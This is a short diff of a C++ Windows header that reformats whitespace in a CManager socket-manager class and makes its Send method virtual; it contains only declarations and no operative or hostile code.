@@ -16,15 +16,15 @@
 
 BOOL WINAPI SelectDesktop();
 
-class CManager  
+class CManager
 {
 	friend class CClientSocket;
-	typedef int (*SENDPROC)(LPBYTE lpData, UINT nSize);
+	typedef int(*SENDPROC)(LPBYTE lpData, UINT nSize);
 public:
 	CManager(CClientSocket *pClient);
 	virtual ~CManager();
 	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
-	int Send(LPBYTE lpData, UINT nSize);
+	virtual int Send(LPBYTE lpData, UINT nSize);
 	CClientSocket	*m_pClient;
 
 	HANDLE		m_hEventDlgOpen;
